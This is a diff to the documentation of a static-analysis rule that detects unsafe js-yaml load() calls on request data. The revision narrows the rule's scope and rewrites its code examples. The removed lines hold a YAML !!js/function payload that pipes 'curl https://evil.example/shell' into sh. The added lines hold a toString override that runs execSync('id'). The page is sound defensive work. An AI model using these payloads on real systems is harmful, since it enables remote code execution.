@@ -1,15 +1,13 @@
 ---
 title: "VNX-NODE-023 – Unsafe YAML.load() with untrusted input"
-description: "Detects js-yaml YAML.load() calls that omit a safe schema, allowing attacker-controlled YAML to execute arbitrary JavaScript code during parsing."
+description: "Reports js-yaml 3 load()/loadAll() of request data or an uploaded file without a safe schema, and load() with DEFAULT_FULL_SCHEMA. Not reported: safeLoad, safe schemas, the program's own files, projects on js-yaml 4+, the yaml package, comments and strings."
 ---
 
 ## Overview
 
-This rule detects calls to `yaml.load()` or `YAML.load()` from the `js-yaml` library where no safe schema (`FAILSAFE_SCHEMA`, `JSON_SCHEMA`, or `CORE_SCHEMA`) is specified. In js-yaml versions 3.x and below, the default schema is `DEFAULT_FULL_SCHEMA`, which supports JavaScript-specific YAML types including `!!js/regexp`, `!!js/undefined`, and `!!js/function`. The `!!js/function` type causes js-yaml to call `new Function(body)()` on the value, executing arbitrary JavaScript during the parse operation.
+In js-yaml 3.x, `load()` and `loadAll()` default to `DEFAULT_FULL_SCHEMA`, which supports the JavaScript-specific types `!!js/regexp`, `!!js/undefined` and `!!js/function`. A `!!js/function` value is compiled with `new Function(...)`, so a document can plant code that runs when the application calls the value or anything coerces it (a `toString` or `valueOf` override). In js-yaml 4.x those types were removed from `load()`, which became the safe loader.
 
-The attack does not require any post-parse processing on the application's part — the code runs the moment `yaml.load()` is called with a crafted document. This means input validation that runs after parsing cannot stop it. In js-yaml 4.x, `load()` no longer accepts `DEFAULT_FULL_SCHEMA` by default, but projects pinned to 3.x remain vulnerable, and the explicit flag `{schema: DEFAULT_FULL_SCHEMA}` reintroduces the risk in any version.
-
-This rule flags calls to `yaml.load()` that lack a safe schema argument so that all YAML parsing paths can be reviewed and hardened.
+The rule reports a js-yaml `load()`/`loadAll()` call (through a name bound to the module, or imported by name or `as` an alias) with no safe schema whose argument is caller-supplied: a request value or an uploaded file buffer (`req.body/query/params/file(s)`, `ctx.request`, `event.body`, `file.buffer`), directly or through a variable assigned from one within the previous 15 lines, including the call written inside a `vm.runInContext()` script. It also reports `load()` with an explicit `DEFAULT_FULL_SCHEMA` and non-constant input. It does not report `safeLoad()`, a `JSON_SCHEMA`/`CORE_SCHEMA`/`FAILSAFE_SCHEMA`/`DEFAULT_SAFE_SCHEMA` argument, `load()` of the program's own files (a request value that only picks which file to read does not supply the YAML), `load()` without a schema when the project's `package.json` depends on js-yaml 4 or later, or the `yaml` and `yamljs` packages.
 
 **Severity:** High | **CWE:** [CWE-502 – Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
 
@@ -24,22 +22,28 @@ Upgrading to js-yaml 4.x and using `yaml.load()` with an explicit safe schema, o
 ## What Gets Flagged
 
 ```javascript
-// FLAGGED: yaml.load() without a safe schema — executes !!js/function tags
+// FLAGGED: js-yaml 3 load() of the request body
 const yaml = require('js-yaml');
-const config = yaml.load(req.body.configYaml);
+const config = yaml.load(req.body);
 
-// FLAGGED: YAML.load() without schema restriction
-const YAML = require('js-yaml');
-const doc = YAML.load(fs.readFileSync(userSuppliedPath, 'utf8'));
+// FLAGGED: two-line form from an upload
+const text = req.file.buffer.toString('utf8');
+const docs = yaml.loadAll(text);
+
+// FLAGGED: the full schema requested explicitly
+yaml.load(text, { schema: yaml.DEFAULT_FULL_SCHEMA });
+
+// Not flagged
+yaml.safeLoad(req.body);
+yaml.load(req.body, { schema: yaml.JSON_SCHEMA });
+yaml.load(fs.readFileSync('./swagger.yml', 'utf8'));
 ```
 
-A malicious YAML payload that achieves RCE:
+A YAML document that plants a function:
 
 ```yaml
-exploit: !!js/function >
-  function() {
-    require('child_process').execSync('curl https://evil.example/shell | sh');
-  }()
+toString: !!js/function >
+  function () { return require('child_process').execSync('id').toString(); }
 ```
 
 ## Remediation
